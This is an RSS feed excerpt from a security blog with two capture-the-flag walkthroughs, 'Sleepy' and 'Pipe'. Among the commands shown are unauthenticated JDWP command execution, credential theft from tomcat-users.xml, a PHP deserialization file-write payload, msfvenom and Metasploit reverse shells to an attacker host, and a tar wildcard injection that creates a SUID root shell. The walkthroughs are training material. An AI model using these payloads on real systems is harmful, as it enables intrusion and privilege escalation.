root@kali:~# cp /etc/libapache2-mod-jk/workers.properties /etc/apache2/

root@kali:~# vi /etc/apache2/workers.properties
worker.ajp13_worker.host=localhost   ---&amp;gt;   worker.ajp13_worker.host=192.168.56.103

root@kali:~# vi /etc/apache2/sites-enabled/000-default.conf
JKMount /* ajp13_worker

root@kali:~# a2enmod proxy_http
root@kali:~# a2enmod proxy_ajp

root@kali:~# service apache2 restart
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now if we browse to our localhost, we get Tomcat on the remote host!&lt;/p&gt;

&lt;div align=&#34;center&#34;&gt;
	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
    
        &lt;img src=&#34;https://rastamouse.me/img/writeups/sleepy/tomcat.png&#34;  /&gt;
    
    
&lt;/figure&gt;
&lt;/div&gt;

&lt;p&gt;I tried all the obvious/default passwords for Tomcat Manager, but no success. Time to turn my attention to JDWP.&lt;/p&gt;

&lt;h2 id=&#34;jdwp:98b6e5636154869990609b71ad7243a9&#34;&gt;JDWP&lt;/h2&gt;

&lt;p&gt;We find that we can attach to the JDWP service without any authentication.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# jdb -attach 192.168.56.103:9001
Set uncaught java.lang.Throwable
Set deferred uncaught java.lang.Throwable
Initializing jdb ...
&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I tried to use the &lt;code&gt;Metasploit Java Debug Wire Protocol Remote Code Execution&lt;/code&gt; exploit, but it wouldn’t work. I later found that payloads were getting written to &lt;code&gt;/tmp&lt;/code&gt;, but they weren’t being executed.&lt;/p&gt;

&lt;p&gt;You can execute your own commands manually with some dirty, dirty Java. There is a pretty good summary of it &lt;a href=&#34;http://blog.silentsignal.eu/2014/02/09/jdb-tricks-hacking-java-debug-wire/&#34;&gt;here&lt;/a&gt;. First, we want to find where the &lt;code&gt;tomcat-users&lt;/code&gt; file is stored.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec(&amp;quot;find / -name tomcat-users.xml&amp;quot;).getInputStream())).readLine())
  = &amp;quot;/etc/tomcat/tomcat-users.xml&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So there are two ways to go about this - the easiest is to copy the file into the FTP directory and download it via your anonymous login. To find the correct directory, I just did another &lt;code&gt;find&lt;/code&gt; for &lt;code&gt;sleepy.png&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec(&amp;quot;find / -name sleepy.png&amp;quot;).getInputStream())).readLine())
  &amp;quot;/var/ftp/pub/sleepy.png&amp;quot;

print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec(&amp;quot;cp /etc/tomcat/tomcat-users.xml /var/ftp/pub/&amp;quot;).getInputStream())).readLine())

ftp&amp;gt; ls
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
-rw-r--r--    1 1002     1002       120456 Jun 18 21:40 sleepy.png
-rw-r--r--    1 1002     1002         2190 Oct 11 22:51 tomcat-users.xml
226 Directory send OK.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The other method is to read the file directly. However, there is a bit of an issue when trying to return files that have newlines in them and as mentioned in that post, there is no way to loop to return multiple lines.&lt;/p&gt;

&lt;div align=&#34;center&#34;&gt;
	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
    
        &lt;img src=&#34;https://rastamouse.me/img/writeups/sleepy/loop.jpg&#34;  /&gt;
    
    
&lt;/figure&gt;
&lt;/div&gt;

&lt;p&gt;This is where the split trick comes in.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;print new java.lang.String(new java.io.BufferedReader(new java.io.InputStreamReader(new java.lang.Runtime().exec(new java.lang.String(&amp;quot;bashXX-cXXcat /etc/tomcat/tomcat-users.xml|tr &#39;\n&#39; &#39; &#39;&amp;quot;).split(&amp;quot;XX&amp;quot;)).getInputStream())).readLine())
  = &amp;quot;&amp;lt;?xml version=&#39;1.0&#39; encoding=&#39;utf-8&#39;?&amp;gt; &amp;lt;!--   Licensed to the Apache Software Foundation (ASF) under one or more   contributor license agreements.  See the NOTICE file distributed with   this work for additional information regarding copyright ownership.   The ASF licenses this file to You under the Apache License, Version 2.0   (the &amp;quot;License&amp;quot;); you may not use this file except in compliance with   the License.  You may obtain a copy of the License at        http://www.apache.org/licenses/LICENSE-2.0    Unless required by applicable law or agreed to in writing, software   distributed under the License is distributed on an &amp;quot;AS IS&amp;quot; BASIS,   WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.   See the License for the specific language governing permissions and   limitations under the License. --&amp;gt; &amp;lt;tomcat-users&amp;gt; &amp;lt;!--   NOTE:  By default, no user is included in the &amp;quot;manager-gui&amp;quot; role required   to operate the &amp;quot;/manager/html&amp;quot; web application.  If you wish to use this app,   you must define such a user - the username and password are arbitrary. --&amp;gt; &amp;lt;!--   NOTE:  The sample user and role entries below are wrapped in a comment   and thus are ignored when reading this file. Do not forget to remove   &amp;lt;!.. ..&amp;gt; that surrounds them. --&amp;gt;   &amp;lt;role rolename=&amp;quot;tomcat&amp;quot;/&amp;gt;   &amp;lt;role rolename=&amp;quot;role1&amp;quot;/&amp;gt;  &amp;lt;!-- &amp;lt;user username=&amp;quot;tomcat&amp;quot; password=&amp;quot;tomcat&amp;quot; roles=&amp;quot;tomcat,manager-gui,admin,manager-jmx,admin-gui,admin-script,manager,manager-script,manager-status&amp;quot;/&amp;gt; --&amp;gt;   &amp;lt;user username=&amp;quot;both&amp;quot; password=&amp;quot;tomcat&amp;quot; roles=&amp;quot;tomcat,role1&amp;quot;/&amp;gt;   &amp;lt;user username=&amp;quot;role1&amp;quot; password=&amp;quot;tomcat&amp;quot; roles=&amp;quot;role1&amp;quot;/&amp;gt;  &amp;lt;role rolename=&amp;quot;admin&amp;quot;/&amp;gt;  &amp;lt;role rolename=&amp;quot;admin-gui&amp;quot;/&amp;gt;  &amp;lt;role rolename=&amp;quot;admin-script&amp;quot;/&amp;gt;  &amp;lt;role rolename=&amp;quot;manager&amp;quot;/&amp;gt; &amp;lt;role rolename=&amp;quot;manager-gui&amp;quot;/&amp;gt;  &amp;lt;role rolename=&amp;quot;manager-script&amp;quot;/&amp;gt; &amp;lt;role rolename=&amp;quot;manager-jmx&amp;quot;/&amp;gt;  &amp;lt;role rolename=&amp;quot;manager-status&amp;quot;/&amp;gt; &amp;lt;!-- &amp;lt;user name=&amp;quot;admin&amp;quot; password=&amp;quot;adminadmin&amp;quot; roles=&amp;quot;admin,manager,admin-gui,admin-script,manager-gui,manager-script,manager-jmx,manager-status&amp;quot; /&amp;gt; --&amp;gt;   &amp;lt;user username=&amp;quot;sl33py&amp;quot; password=&amp;quot;Gu3SSmYStR0NgPa$sw0rD!&amp;quot; roles=&amp;quot;tomcat,manager-gui,admin-gui,admin,manager-jmx,admin-script,manager,manager-script,manager-status&amp;quot;/&amp;gt;  &amp;lt;/tomcat-users&amp;gt; &amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The reason this works, is that the &lt;code&gt;exec()&lt;/code&gt; method requires an array to be passed, as described &lt;a href=&#34;https://docs.oracle.com/javase/7/docs/api/java/lang/Runtime.html&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;exec(String[] cmdarray)
Executes the specified command and arguments in a separate process.
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;code&gt;username=&amp;quot;sl33py&amp;quot; password=&amp;quot;Gu3SSmYStR0NgPa$sw0rD!&amp;quot;&lt;/code&gt; is what we were after - and now we can log into the Tomcat Manager. To get a shell, we’ll use the &lt;code&gt;Tomcat Manager Authenticated Upload Code Execution&lt;/code&gt; module.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;PASSWORD   Gu3SSmYStR0NgPa$sw0rD!
RHOST      127.0.0.1
RPORT      80
TARGETURI  /manager
USERNAME   sl33py
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I set my target as &lt;code&gt;Linux x86&lt;/code&gt; and used the &lt;code&gt;linux/x86/meterpreter/reverse_tcp&lt;/code&gt; payload, but you could also use a Java-based payload.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;msf exploit(tomcat_mgr_upload) &amp;gt; exploit

[*] Started reverse handler on 192.168.56.101:4444
[*] 127.0.0.1:80 - Retrieving session ID and CSRF token...
[*] 127.0.0.1:80 - Finding CSRF token...
[*] 127.0.0.1:80 - Uploading and deploying V5bvuvzO1juTdM...
[*] 127.0.0.1:80 - Uploading 1866 bytes as V5bvuvzO1juTdM.war ...
[*] 127.0.0.1:80 - Executing V5bvuvzO1juTdM...
[*] 127.0.0.1:80 - Executing /V5bvuvzO1juTdM/AcVlSx5ZMqE9wtXvp5cLRc3dRPgGXgO.jsp...
[*] Transmitting intermediate stager for over-sized stage...(105 bytes)
[*] 127.0.0.1:80 - Finding CSRF token...
[*] 127.0.0.1:80 - Undeploying V5bvuvzO1juTdM ...
[*] Sending stage (1495598 bytes) to 192.168.56.103
[*] Meterpreter session 1 opened (192.168.56.101:4444 -&amp;gt; 192.168.56.103:38344) at 2015-10-13 21:52:42 +0100

meterpreter &amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;tty-nightmare:98b6e5636154869990609b71ad7243a9&#34;&gt;TTY Nightmare&lt;/h2&gt;

&lt;p&gt;If we go in search for SUID binaries (owned by root), we find a suspicious looking candidate.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;sh-4.2$ find / -user root -perm -4000 -print 2&amp;gt; /dev/null
/usr/bin/mount
/usr/bin/chage
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/su
/usr/bin/chsh
/usr/bin/umount
/usr/bin/sudo
/usr/bin/pkexec
/usr/bin/crontab
/usr/bin/nightmare   &amp;lt;--- this sucker
/usr/bin/passwd
/usr/sbin/pam_timestamp_check
/usr/sbin/unix_chkpwd
/usr/sbin/usernetctl
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib64/dbus-1/dbus-daemon-launch-helper

sh-4.2$ ls -l /usr/bin/nightmare
-rwsr-s---. 1 root tomcat 8669 Jan 18  2015 /usr/bin/nightmare

sh-4.2$ /usr/bin/nightmare
[-] error: no tty present
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I downloaded the binary to my host so I could analyse it.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# file nightmare
nightmare: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 2.6.26, BuildID[sha1]=708d5928a47d433d5b40fca49305e332808e743a, not stripped

root@kali:~# ./nightmare
sh: 1: /usr/bin/aafire: not found
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;I downloaded &lt;code&gt;/usr/bin/aafire&lt;/code&gt; and ran &lt;code&gt;nightmare&lt;/code&gt; again. This time I got saw cool ASCII fire going - but then another binary tries to get executed: &lt;code&gt;/usr/bin/sl&lt;/code&gt;. I downloaded this one too, and finally got this:&lt;/p&gt;

&lt;video width=&#34;320&#34; height=&#34;240&#34; controls&gt;
  &lt;source src=&#34;https://rastamouse.me/img/writeups/sleepy/vid.webm&#34; type=&#34;video/webm&#34;&gt;
Your browser does not support the video tag.
&lt;/video&gt;

&lt;p&gt;First the binary checks to see if &lt;code&gt;tty&lt;/code&gt; is present.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;mov    esi,0x2
mov    edi,0x400a0c
mov    eax,0x0
call   0x400690 &amp;lt;open@plt&amp;gt;

x/s 0x400a0c
0x400a0c: &amp;quot;/dev/tty&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;There are two functions called &lt;code&gt;fire&lt;/code&gt; and &lt;code&gt;train&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ pdisass fire

push   rbp
mov    rbp,rsp
mov    edi,0x4009fc
call   0x400640 &amp;lt;system@plt&amp;gt;
pop    rbp
ret

gdb-peda$ x/s 0x4009fc
0x4009fc: &amp;quot;/usr/bin/aafire&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ pdisass train

push   rbp
mov    rbp,rsp
mov    edx,0x0
mov    esi,0x0
mov    edi,0x0
mov    eax,0x0
call   0x400620 &amp;lt;setresuid@plt&amp;gt;
mov    edx,0x0
mov    esi,0x0
mov    edi,0x0
mov    eax,0x0
call   0x400630 &amp;lt;setresgid@plt&amp;gt;
mov    edi,0x4009ec
call   0x400640 &amp;lt;system@plt&amp;gt;
pop    rbp
ret

x/s 0x4009ec
0x4009ec: &amp;quot;/usr/bin/sl -al&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Finally, there is a &lt;code&gt;sigHandler&lt;/code&gt; function.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;gdb-peda$ pdisass sigHandler

push   rbp
mov    rbp,rsp
sub    rsp,0x10
mov    DWORD PTR [rbp-0x4],edi
mov    eax,0x0
call   0x4007cd &amp;lt;train&amp;gt;
mov    edi,0x0
call   0x4006a0 &amp;lt;exit@plt&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So, to summerise:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;The binary checks for &lt;code&gt;tty&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;(if yes) &lt;code&gt;/usr/bin/aafire&lt;/code&gt; is executed&lt;/li&gt;
&lt;li&gt;This runs until the user presses Ctrl+C (i.e. a SIGINT)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;setresuid&lt;/code&gt; and &lt;code&gt;setresgid&lt;/code&gt; are both set to &lt;code&gt;0&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/usr/bin/sl -al&lt;/code&gt; is executed&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;I found a really ugly way to solve this, without having a proper interactive shell. Using the classic ‘python pty’ trick, the binary will partially run. But first define the new function.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;bash-4.2$ function /usr/bin/sl() { /bin/sh; }
bash-4.2$ export -f /usr/bin/sl

bash-4.2$ /usr/bin/nightmare
Error opening terminal: unknown.
[+] Again [y/n]?
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now, in a second shell:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;bash-4.2$ ps aux | grep nightmare
root  3948    0.0     0.0     4164    356 pts/7   S+  01:41   0:00 /usr/bin/nightmare

bash-4.2$ kill -2 3948
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Go back to the previous shell, and a new root shell should be waiting.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;bash-4.2$ /usr/bin/nightmare
Error opening terminal: unknown.
[+] Again [y/n]? sh-4.2# id
uid=0(root) gid=0(root) group=0(root),91(tomcat)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Sagi- has a nice trick for getting a proper interactive shell using &lt;code&gt;busybox&lt;/code&gt;, which you should definitely check out.&lt;/p&gt;

&lt;h2 id=&#34;flag:98b6e5636154869990609b71ad7243a9&#34;&gt;Flag&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;sh-4.2# cat /root/flag.txt
Well done!

Here&#39;s your flag: 3eb030c6ab099b0a355712fe38d59ffb
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;This is the MD5 of &lt;code&gt;pewpewpew&lt;/code&gt; :)&lt;/p&gt;

&lt;p&gt;Thanks Sagi- for another awesome VM - I learned a lot doing this one!&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>/dev/random: Pipe</title>
      <link>https://rastamouse.me/writeups/2015/pipe/</link>
      <pubDate>Fri, 02 Oct 2015 00:00:00 +0000</pubDate>
      
      <guid>https://rastamouse.me/writeups/2015/pipe/</guid>
      <description>

&lt;p&gt;Pipe was a VM created by &lt;a href=&#34;https://twitter.com/s4gi_&#34;&gt;Sagi-&lt;/a&gt; for &lt;a href=&#34;http://zacon.org.za&#34;&gt;ZaCon&lt;/a&gt;.  It&amp;rsquo;s quite a short VM, presumably to fit confortably in a con session - but it&amp;rsquo;s fun nonetheless!&lt;/p&gt;

&lt;h1 id=&#34;scan-dem-ports:378c41c5fac16f89c224b95690922b7e&#34;&gt;Scan dem Ports&lt;/h1&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# nmap -n -p- -A 192.168.56.102

PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 16:48:50:89:e7:c9:1f:90:ff:15:d8:3e:ce:ea:53:8f (DSA)
|   2048 ca:f9:85:be:d7:36:47:51:4f:e6:27:84:72:eb:e8:18 (RSA)
|_  256 d8:47:a0:87:84:b2:eb:f5:be:fc:1c:f1:c9:7f:e3:52 (ECDSA)
80/tcp    open  http    Apache httpd
| http-auth: 
| HTTP/1.1 401 Unauthorized
|_  Basic realm=index.php
|_http-methods: No Allow or Public header in OPTIONS response (status code 401)
|_http-server-header: Apache
|_http-title: 401 Unauthorized
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          33500/udp  status
|_  100024  1          36100/tcp  status
36100/tcp open  status  1 (RPC #100024)
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;verb-abuse:378c41c5fac16f89c224b95690922b7e&#34;&gt;Verb Abuse&lt;/h2&gt;

&lt;p&gt;Hop on over to the web service, and we&amp;rsquo;re blocked by an authorisation prompt.&lt;/p&gt;

&lt;div align=&#34;center&#34;&gt;
	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
    
        &lt;img src=&#34;https://rastamouse.me/img/writeups/pipe/auth.jpg&#34;  /&gt;
    
    
&lt;/figure&gt;
&lt;/div&gt;

&lt;p&gt;If we intercept the traffic in burpsuite, you can see that the page being requested is &lt;code&gt;index.php&lt;/code&gt;.  After doing a bit of tampering, I found that you could bypass the authentication by using an invalid verb.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;MEH /index.php HTTP/1.1
Host: 192.168.56.102
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Next we see a page entitled &amp;ldquo;The Treachery of Images&amp;rdquo; - at the bottom of the page is a hyperlink that runs some javascript.  Looking at the source, we see what is suspiciouslly like serialized data.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;&amp;quot;O:4:\&amp;quot;Info\&amp;quot;:4:&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;div align=&#34;center&#34;&gt;
	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
    
        &lt;img src=&#34;https://rastamouse.me/img/writeups/pipe/rene.jpg&#34;  /&gt;
    
    
&lt;/figure&gt;
&lt;/div&gt;

&lt;p&gt;Intercepting the POST request in Burp confirms this:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;param=O:4:&amp;quot;Info&amp;quot;:4:{s:2:&amp;quot;id&amp;quot;;i:1;s:9:&amp;quot;firstname&amp;quot;;s:4:&amp;quot;Rene&amp;quot;;s:7:&amp;quot;surname&amp;quot;;s:8:&amp;quot;Margitte&amp;quot;;s:7:&amp;quot;artwork&amp;quot;;s:23:&amp;quot;The Treachery of Images&amp;quot;;}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Also within the source, is the location of some javascript serializing code - navigating to this directory, we find another file.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;src=&amp;quot;scriptz/php.js&amp;quot;
&lt;/code&gt;&lt;/pre&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Index of /scriptz
    log.php.BAK
    php.js
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Peeking at &lt;code&gt;log.php.BAK&lt;/code&gt; reveals the code for the page - it&amp;rsquo;s reasonable to assume that this is a backup of &lt;code&gt;index.php&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
class Log
{
    public $filename = &#39;&#39;;
    public $data = &#39;&#39;;

    public function __construct()
    {
        $this-&amp;gt;filename = &#39;&#39;;
  $this-&amp;gt;data = &#39;&#39;;
    }

    public function PrintLog()
    {
        $pre = &amp;quot;[LOG]&amp;quot;;
  $now = date(&#39;Y-m-d H:i:s&#39;);

        $str = &#39;$pre - $now - $this-&amp;gt;data&#39;;
        eval(&amp;quot;\$str = \&amp;quot;$str\&amp;quot;;&amp;quot;);
        echo $str;
    }

    public function __destruct()
    {
  file_put_contents($this-&amp;gt;filename, $this-&amp;gt;data, FILE_APPEND);
    }
}
?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We see that there&amp;rsquo;s a function that could enable us to write files to the web server - a prime opportunity to write a PHP shell.  But first, we&amp;rsquo;ll try something simple.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php

class Log {

  public function __construct() {
    $this-&amp;gt;filename = &#39;/var/www/html/scriptz/test.php&#39;;
    $this-&amp;gt;data = &#39;&amp;lt;?php phpinfo(); ?&amp;gt;&#39;;
  }

  public function __destruct() {
    file_put_contents($this-&amp;gt;filename, $this-&amp;gt;data, FILE_APPEND);
  }
}

print serialize(new Log);

?&amp;gt;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;We do have permission to write into the webroot &lt;code&gt;/var/www/html&lt;/code&gt; as well as &lt;code&gt;scriptz&lt;/code&gt;.  Since &lt;code&gt;scriptz&lt;/code&gt; allows us to list the directory, it makes it easier to know if our write has succeeded.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;root@kali:~# php put-file.php 
O:3:&amp;quot;Log&amp;quot;:2:{s:8:&amp;quot;filename&amp;quot;;s:30:&amp;quot;/var/www/html/scriptz/test.php&amp;quot;;s:4:&amp;quot;data&amp;quot;;s:19:&amp;quot;&amp;lt;?php phpinfo(); ?&amp;gt;&amp;quot;;}
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now just copy this text as the value for &lt;code&gt;param&lt;/code&gt; in the POST request.  It&amp;rsquo;s easiest to do this via the Burp Repeater.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;Index of /scriptz
    log.php.BAK
    php.js
    test.php
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Go to &lt;code&gt;test.php&lt;/code&gt; just to make sure it works&amp;hellip;&lt;/p&gt;

&lt;div align=&#34;center&#34;&gt;
	&lt;figure style=&#34;background-color: #f2f0ec;&#34; &gt;
    
        &lt;img src=&#34;https://rastamouse.me/img/writeups/pipe/phpinfo.jpg&#34;  /&gt;
    
    
&lt;/figure&gt;
&lt;/div&gt;

&lt;p&gt;Excellent - time to upload a shell.  I opt for a Staged Meterpreter PHP payload, since it&amp;rsquo;s small and flexible.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;msfvenom -p php/meterpreter/reverse_php LHOST=192.168.56.101 LPORT=4444 -f raw | base64 | tr -d &#39;\n&#39;

$this-&amp;gt;filename = &#39;/var/www/html/scriptz/shell.php&#39;;
$this-&amp;gt;data =&#39;&amp;lt;?php eval(base64_decode(\&#39;Lyo8P3BocC[...snip...]BkaWUoKTs=\&#39;)) ?&amp;gt;&#39;;
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Remember to escape your &lt;code&gt;&#39;&lt;/code&gt;.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;msf exploit(handler) &amp;gt; run 

[*] Started reverse handler on 192.168.56.101:4444 
[*] Starting the payload handler...
[*] Sending stage (32461 bytes) to 192.168.56.102
[*] Meterpreter session 1 opened (192.168.56.101:4444 -&amp;gt; 192.168.56.102:48112) at 2015-10-02 21:26:16 +0100

meterpreter &amp;gt; getuid 
Server username: www-data (33)
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;rene:378c41c5fac16f89c224b95690922b7e&#34;&gt;Rene&lt;/h2&gt;

&lt;p&gt;After looking around the file system a bit, I spotted some files in rene&amp;rsquo;s home directory.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;meterpreter &amp;gt; ls /home/rene
40777/rwxrwxrwx   4096  dir   2015-10-02 21:27:01 +0100  backup

meterpreter &amp;gt; ls /home/rene/backup
100644/rw-r--r--  98925  fil   2015-10-02 21:25:01 +0100  backup.tar.gz
100644/rw-r--r--  30263  fil   2015-10-02 21:27:01 +0100  sys-10582.BAK
100644/rw-r--r--  17323  fil   2015-10-02 21:27:01 +0100  sys-4811.BAK
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;After some time, we notice that &lt;code&gt;sys-*&lt;/code&gt; files are created and removed periodically, and that the timestamp on &lt;code&gt;backup.tar.gz&lt;/code&gt; changes.  This leads us to believe some sort of scheduled job is running, so we go in search for cronjobs.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;meterpreter &amp;gt; cat /etc/crontab

* * * * * root /root/create_backup.sh
*/5 * * * * root /usr/bin/compress.sh

meterpreter &amp;gt; ls /usr/bin/compress.sh
100755/rwxr-xr-x  190  fil  2015-07-06 02:12:03 +0100  /usr/bin/compress.sh

meterpreter &amp;gt; cat /usr/bin/compress.sh
#!/bin/sh

rm -f /home/rene/backup/backup.tar.gz
cd /home/rene/backup
tar cfz /home/rene/backup/backup.tar.gz *
chown rene:rene /home/rene/backup/backup.tar.gz
rm -f /home/rene/backup/*.BAK
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;So every minute &lt;code&gt;/root/create_backup.sh&lt;/code&gt; is run, and every 5 minutes &lt;code&gt;/usr/bin/compress.sh&lt;/code&gt; runs.  This second script is world readable, so we can inspect it.  What we see is a classic tar command injection vulnerability due to the wildcard.  This backup directory is world writeable - so we can slap our exploit in easily.&lt;/p&gt;

&lt;p&gt;I created a simple script that would copy &lt;code&gt;sh&lt;/code&gt; and set the suid bit.&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;meterpreter &amp;gt; edit shell.sh
cp /bin/sh /tmp/sh
chmod 4777 /tmp/sh
(:wq)

meterpreter &amp;gt; edit &amp;quot;--checkpoint-action=exec=sh shell.sh&amp;quot;
(:wq)
meterpreter &amp;gt; edit &amp;quot;--checkpoint=1&amp;quot;
(:wq)
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Sit back, and&amp;hellip;&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;meterpreter &amp;gt; ls /tmp
104777/rwxrwxrwx  125400  fil   2015-10-02 21:30:01 +0100  sh

meterpreter &amp;gt; execute -f /tmp/sh -c -i
whoami
root
&lt;/code&gt;&lt;/pre&gt;

&lt;h2 id=&#34;flag:378c41c5fac16f89c224b95690922b7e&#34;&gt;Flag&lt;/h2&gt;

&lt;pre&gt;&lt;code class=&#34;language-text&#34;&gt;                                                                   .aMMMMMMMMn.  ,aMMMMn.
                                                                 .aMccccccccc*YMMn.    `Mb
                                                                aMccccccccccccccc*Mn    MP
                                                               .AMMMMn.   MM `*YMMY*ccaM*
                                                              dM*  *YMMb  YP        `cMY
                                                              YM.  .dMMP   aMn.     .cMP
                                                               *YMMn.     aMMMMMMMMMMMY&#39;
                                                                .&#39;YMMb.           ccMP
                                                             .dMcccccc*Mc....cMb.cMP&#39;
                                                           .dMMMMb;cccc*Mbcccc,IMMMMMMMn.
                                                          dY*&#39;  &#39;*M;ccccMM..dMMM..MP*cc*Mb
                                                          YM.    ,MbccMMMMMMMMMMMM*cccc;MP
                                                           *Mbn;adMMMMMMMMMMMMMMMIcccc;M*
                                                          dPcccccIMMMMMMMMMMMMMMMMa;c;MP
                                                          Yb;cc;dMMMMMMMMMMMP*&#39;  *YMMP*
                                                           *YMMMPYMMMMMMP*&#39;          curchack
                                                       +####################################+
                                                       |======                            | |
                                                       |======                            | |
                                                       |======                            | |
                                                       |======                            | |
                                                       |======                            | |
                                                       +----------------------------------+-+
                                                        ####################################
                                                             |======                  |
                                                             |======                  |
                                                             |=====                   |
                                                             |====                    |
                                                             |                        |
                                                             +                        +

 .d8888b.                 d8b          d8b               888                                                                    d8b
d88P  Y88b                Y8P          88P               888                                                                    Y8P
888    888                             8P                888
888        .d88b.  .d8888b888   88888b.&amp;quot;  .d88b. .d8888b 888888   88888b.  8888b. .d8888b    888  88888888b.  .d88b.    88888b. 88888888b.  .d88b.
888       d8P  Y8bd88P&amp;quot;   888   888 &amp;quot;88b d8P  Y8b88K     888      888 &amp;quot;88b    &amp;quot;88b88K        888  888888 &amp;quot;88bd8P  Y8b   888 &amp;quot;88b888888 &amp;quot;88bd8P  Y8b
